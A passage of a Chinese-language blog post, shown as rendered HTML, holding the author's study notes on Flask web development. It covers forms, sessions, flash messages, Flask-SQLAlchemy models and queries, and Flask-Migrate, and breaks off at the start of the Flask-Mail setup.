class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者借助Flask-Bootstrap</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> <span class="string">&quot;bootstrap/wtf.html&quot;</span> <span class="keyword">as</span> wtf %&#125; <span class="comment"># wtf 辅助函数</span></span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends <span class="string">&quot;base.html&quot;</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">import</span> <span class="string">&quot;bootstrap/wtf.html&quot;</span> <span class="keyword">as</span> wtf %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line">&lt;div class=&quot;page-header&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Hello, &#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;!&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>然后在视图函数,实例化出一个NameForm,传给模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = <span class="literal">None</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit(): <span class="comment"># 验证表单是否提交</span></span><br><span class="line">        name = form.name.data</span><br><span class="line">        form.name.data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, current_time=datetime.utcnow(), form=form, name=name)</span><br></pre></td></tr></table></figure><p>效果大概就是 输入lonmar</p><p><img src="1611217839671.png" alt="1611217839671"></p><h3 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h3><p>上面的代码就已经包含了这表单处理的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = <span class="literal">None</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit(): <span class="comment"># 验证表单是否提交 </span></span><br><span class="line">        name = form.name.data</span><br><span class="line">        form.name.data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, current_time=datetime.utcnow(), form=form, name=name)</span><br></pre></td></tr></table></figure><p>提交表单后，如果数据能被所有验证函数接受，那么 validate_on_submit() 方法的返回值为 True ，否则返回 False </p><blockquote><p>这个函数的返回值决定是重新渲染表单还是处理表单提交的数据</p></blockquote><h3 id="使用url-for和session改善体验"><a href="#使用url-for和session改善体验" class="headerlink" title="使用url_for和session改善体验"></a>使用url_for和session改善体验</h3><p>提交表单之后再刷新会这样,影响用户体验</p><p><img src="1611218214155.png" alt="1611218214155"></p><p>可以用下面代码改善</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = <span class="literal">None</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = form.name.data</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, current_time=datetime.utcnow(), form=form, name=session.get(<span class="string">&#x27;name&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="Flash消息"><a href="#Flash消息" class="headerlink" title="Flash消息"></a>Flash消息</h3><p>直接看代码和效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for, flash</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># 路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = <span class="literal">None</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        old_name = session.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> old_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> old_name != form.name.data:</span><br><span class="line">            flash(<span class="string">&#x27;Looks like you have changed your name!&#x27;</span>) <span class="comment"># flash</span></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = form.name.data</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, current_time=datetime.utcnow(), form=form, name=session.get(<span class="string">&#x27;name&#x27;</span>))</span><br></pre></td></tr></table></figure><p>然后相应的base.html中要写渲染Flash消息的模板,写在block content里面</p><p>模板中使用<code>get_flashed_messages()</code>获取 flash消息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &#123;#  flash  #&#125;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &#123;% for message in get_flashed_messages() %&#125;</span><br><span class="line">            &lt;div class&#x3D;&quot;alert alert-info&quot;&gt;</span><br><span class="line">                &lt;button type&#x3D;&quot;button&quot; class&#x3D;&quot;close&quot; data-dismiss&#x3D;&quot;alert&quot;&gt;&amp;times;&lt;&#x2F;button&gt;</span><br><span class="line">                &#123;&#123; message &#125;&#125;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &#123;% block page_content %&#125;&#123;% endblock %&#125;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>效果就是</p><p><img src="1611219092580.png" alt="1611219092580"></p><h2 id="第五章-数据库操作"><a href="#第五章-数据库操作" class="headerlink" title="第五章 数据库操作"></a>第五章 数据库操作</h2><p>主要是Flask-SQLAlchemy的使用 <a href="http://pythonhosted.org/Flask-SQLAlchemy/">http://pythonhosted.org/Flask-SQLAlchemy/</a></p><p>这个 Flask 扩展包装了 SQLAlchemy（<a href="http://www.sqlalchemy.org/%EF%BC%89%E6%A1%86%E6%9E%B6">http://www.sqlalchemy.org/）框架</a></p><p>安装 <code> pip install flask-sqlalchemy</code></p><p> Flask-SQLAlchemy支持多种数据库, 数据库使用 URL 指定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MySQL    mysql:&#x2F;&#x2F;username:password@hostname&#x2F;database</span><br><span class="line">Postgres    postgresql:&#x2F;&#x2F;username:password@hostname&#x2F;database</span><br><span class="line">SQLite(Unix)    sqlite:&#x2F;&#x2F;&#x2F;&#x2F;absolute&#x2F;path&#x2F;to&#x2F;database</span><br><span class="line">SQLite(Windows)    sqlite:&#x2F;&#x2F;&#x2F;c:&#x2F;absolute&#x2F;path&#x2F;to&#x2F;database</span><br></pre></td></tr></table></figure><blockquote><p>SQLite 数据库不需要使用服务器，因此不用指定 hostname、username 和password.</p><p>URL 中的 database 是硬盘上文件的文件名</p></blockquote><p>程序使用的数据库 URL 必须保存到 Flask 配置对象的 SQLALCHEMY_DATABASE_URI 键中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] &#x3D; &#39;mysql:&#x2F;&#x2F;root:123456@localhost&#x2F;MysqlTest&#39;</span><br></pre></td></tr></table></figure><p>使用示例: 以 SQLite为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy <span class="comment"># 导入</span></span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] =<span class="string">&#x27;sqlite:///&#x27;</span> + os.path.join(basedir, <span class="string">&#x27;data.sqlite&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br></pre></td></tr></table></figure><p><code>app.config[&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;] = True</code> =&gt; 每次请求结束后都会自动提交数据库中的变动</p><p><code>db </code>对象是 <code>SQLAlchemy </code>类的实例，表示程序使用的数据库</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><p><img src="1611223257517.png" alt="1611223257517"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;roles&#x27;</span> <span class="comment"># 表名</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>) <span class="comment"># column </span></span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>) <span class="comment"># 不允许重复</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># __repr__ 返回一个具有可读性的字符串表示模型</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;Role %r&gt;&#x27;</span> % self.name</span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;users&#x27;</span> <span class="comment"># 表名</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>) <span class="comment"># primary_key+True 设置id为主键</span></span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)  <span class="comment"># unique=True 该值不允许重复</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;User %r&gt;&#x27;</span> % self.username</span><br></pre></td></tr></table></figure><p><code>__tablename__</code> : 类变量, 数据库中所使用的表名</p><blockquote><p>如果没有定义<code>__tablename__</code>，Flask-SQLAlchemy 会使用一个默认名字,但是可能不符合命名规范</p></blockquote><p><code> db.Column</code>: 用来实例化为列对象,可选参数如下:</p><p><img src="1611223756150.png" alt="1611223756150"></p><p>常使用的一些列选项</p><p><img src="1611223821115.png" alt="1611223821115"></p><blockquote><p>Flask-SQLAlchemy 要求每个模型都要定义主键 ，这一列经常命名为 id </p></blockquote><p><code> __repr()__</code> : 可用于调试, 测试</p><h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3><p><img src="1611223257517.png" alt="1611223257517"></p><p>上面只是定义了两张表,但是两张表之间是有一对一关系的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;roles&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;Role %r&gt;&#x27;</span> % self.name</span><br><span class="line">    </span><br><span class="line">    users = db.relationship(<span class="string">&#x27;User&#x27;</span>, backref=<span class="string">&#x27;role&#x27;</span>)  <span class="comment"># 在关系的另一个模型中添加反向引用</span></span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;User %r&gt;&#x27;</span> % self.username</span><br><span class="line">    </span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;roles.id&#x27;</span>)) <span class="comment"># 外键 这列的值是 roles 表中行的 id 值</span></span><br></pre></td></tr></table></figure><blockquote><p>这个还不太懂=.=,等有时间翻一下官方文档 <a href="https://www.osgeo.cn/sqlalchemy/">https://www.osgeo.cn/sqlalchemy/</a></p></blockquote><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><ul><li><p>创建表</p><p>在python shell中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> hello <span class="keyword">import</span> db</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.create_all()</span><br></pre></td></tr></table></figure><p>会新建一个 data.sqlite 的数据库文件</p><p>如果数据库表已经存在于数据库中，那么 db.create_all()不会重新创建或者更新这个表,需要:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.drop_all()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.create_all()</span><br></pre></td></tr></table></figure><p>还可以使用Flask-Migrate进行数据库迁移(不会丢失数据)</p></li><li><p>插入数据</p><p>需要先实例化表对象,实例化的时候带着参数,id(主键)由Flask-SQLAlchemy统一管理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hello <span class="keyword">import</span> Role, User</span><br><span class="line">admin_role = Role(name=<span class="string">&#x27;Admin&#x27;</span>)</span><br><span class="line">mod_role = Role(name=<span class="string">&#x27;Moderator&#x27;</span>)</span><br><span class="line">user_role = Role(name=<span class="string">&#x27;User&#x27;</span>)</span><br><span class="line">user_john = User(username=<span class="string">&#x27;john&#x27;</span>, role=admin_role)</span><br><span class="line">user_susan = User(username=<span class="string">&#x27;susan&#x27;</span>, role=user_role)</span><br><span class="line">user_david = User(username=<span class="string">&#x27;david&#x27;</span>, role=user_role)</span><br></pre></td></tr></table></figure><p>通过数据库会话( db.session) 管理对数据库所做的改动</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db.session.add(admin_role)</span><br><span class="line">db.session.add(mod_role)</span><br><span class="line">db.session.add(user_role)</span><br><span class="line">db.session.add(user_john)</span><br><span class="line">db.session.add(user_susan)</span><br><span class="line">db.session.add(user_david)</span><br></pre></td></tr></table></figure><p>或者简写为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.session.add_all([admin_role, mod_role, user_role,user_john, user_susan, user_david])</span><br></pre></td></tr></table></figure><p>调用 commit() 方法提交会话 =&gt; 把对象写入数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><blockquote><p>数据库会话也称为事务</p></blockquote></li><li><p>修改数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin_role.name = <span class="string">&#x27;Administrator&#x27;</span></span><br><span class="line">db.session.add(admin_role)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure></li><li><p>删除数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.session.delete(mod_role)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure></li><li><p>查询数据</p><p>Flask-SQLAlchemy 为每个模型类都提供了 query 对象,可以通过这个对象的方法进行查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Role.query.<span class="built_in">all</span>() <span class="comment"># 查询表中所有数据</span></span><br><span class="line"><span class="comment"># [&lt;Role u&#x27;admin&#x27;&gt;, &lt;Role u&#x27;Moderator&#x27;&gt;, &lt;Role u&#x27;User&#x27;&gt;]</span></span><br><span class="line"></span><br><span class="line">User.query.filter_by(role=user_role).<span class="built_in">all</span>() <span class="comment"># filter_by()过滤器</span></span><br><span class="line"><span class="comment"># [&lt;User u&#x27;susan&#x27;&gt;, &lt;User u&#x27;david&#x27;&gt;]</span></span><br></pre></td></tr></table></figure><p>查看原生的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;&gt;</span><span class="operator">&gt;</span> str(User.query.filter_by(role<span class="operator">=</span>user_role))</span><br><span class="line"><span class="string">&#x27;SELECT users.id AS users_id, users.username AS users_username, users.role_id AS users_role_id \nFROM users \nWHERE ? = users.role_id&#x27;</span></span><br></pre></td></tr></table></figure><p>退出shell后.再重新进入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hello <span class="keyword">import</span> Role</span><br><span class="line">user_role = Role.query.filter_by(name=<span class="string">&#x27;User&#x27;</span>).first()</span><br><span class="line"><span class="comment"># user_role直接就是一个对象了,不需要再实例化</span></span><br></pre></td></tr></table></figure><p>常见过滤器,完整的可以参考<a href="http://docs.sqlalchemy.org/">http://docs.sqlalchemy.org</a></p><p><img src="1611295414659.png" alt="1611295414659"></p></li></ul><p>还有一些执行查询的方法</p><blockquote><p><code>Role.query.filter_by(name=&#39;User&#39;)</code></p><p>=&gt; <code> &lt;flask_sqlalchemy.BaseQuery object at 0x000000000338A848&gt;</code></p><p><code>Role.query.filter_by(name=&#39;User&#39;).all()</code></p><p>=&gt; <code>[&lt;Role u&#39;User&#39;&gt;]</code></p></blockquote><p><img src="1611295488079.png" alt="1611295488079"></p><h3 id="在视图函数操作数据库"><a href="#在视图函数操作数据库" class="headerlink" title="在视图函数操作数据库"></a>在视图函数操作数据库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        testUser = User.query.filter_by(username=form.name.data).first()</span><br><span class="line">        <span class="keyword">if</span> testUser <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            testUser = User(username=form.name.data)</span><br><span class="line">            db.session.add(testUser)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            session[<span class="string">&#x27;known&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;known&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;name&#x27;</span>] = form.name.data</span><br><span class="line">            form.name.data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line">                           current_time=datetime.utcnow(),</span><br><span class="line">                           form=form,</span><br><span class="line">                           name=session.get(<span class="string">&#x27;name&#x27;</span>),</span><br><span class="line">                           known=session.get(<span class="string">&#x27;known&#x27;</span>, <span class="literal">False</span>))</span><br></pre></td></tr></table></figure><h3 id="集成Python-shell"><a href="#集成Python-shell" class="headerlink" title="集成Python shell"></a>集成Python shell</h3><p>让 Flask-Script 的 shell 命令自动导入特定的对象,如db,Role等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_script <span class="keyword">import</span> Shell, Manager</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">manager = Manager(app)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_shell_context</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(app=app, db=db, User=User, Role=Role)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    manager.add_command(<span class="string">&quot;shell&quot;</span>, Shell(make_context=make_shell_context))</span><br><span class="line">    manager.debug = <span class="literal">True</span></span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure><p>然后python hello.py shell</p><p><img src="1611297903445.png" alt="1611297903445"></p><h3 id="数据库迁移"><a href="#数据库迁移" class="headerlink" title="数据库迁移"></a>数据库迁移</h3><p>SQLAlchemy 的主力开发人员编写了一个迁移框架,Alembic(<a href="https://alembic.readthedocs.org/en/latest/index.html">https://alembic.readthedocs.org/en/latest/index.html</a>)</p><p>Flask 程序还可使用 Flask-Migrate(<a href="http://flask-migrate.readthedocs.org/en/latest/)%E6%89%A9%E5%B1%95">http://flask-migrate.readthedocs.org/en/latest/)扩展</a></p><p>这个扩展对 Alembic 做了轻量级包装，并集成到了 Flask-Script 中</p><p>安装 <code>pip install flask-migrate</code></p><p>使用:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_migrate <span class="keyword">import</span> Migrate, MigrateCommand</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">migrate = Migrate(app, db)</span><br><span class="line">manager.add_command(<span class="string">&#x27;db&#x27;</span>, MigrateCommand)</span><br></pre></td></tr></table></figure><p>为了导出数据库迁移命令，Flask-Migrate 提供了一个 MigrateCommand 类，可附加到 Flask-Script 的 manager 对象上</p><p><code>python hello.py db init</code> 创建迁移仓库,这个命令会创建 migrations 文件夹，所有迁移脚本都存放其中</p><p><code>python hello.py db migrate -m &quot;initial migration&quot;</code> 创建迁移脚本</p><p><code>python hello.py db upgrade</code> 将迁移应用到数据库</p><blockquote><p>没搞懂什么原理,数据库模型做出更改时执行<code>python hello.py db upgrade</code>应该就行了</p></blockquote><h2 id="第六章-电子邮件"><a href="#第六章-电子邮件" class="headerlink" title="第六章 电子邮件"></a>第六章 电子邮件</h2><p>安装 <code>pip install flask-mail</code></p><p>使用和配置:</p><p>Flask-Mail SMTP服务器的配置</p><p><img src="1611300161723.png" alt="1611300161723"></p><p>书中只给了连接Gmail的SMTP服务的具体使用方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Mail</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">mail = Mail(app)</span><br><span class="line">app.config[<span 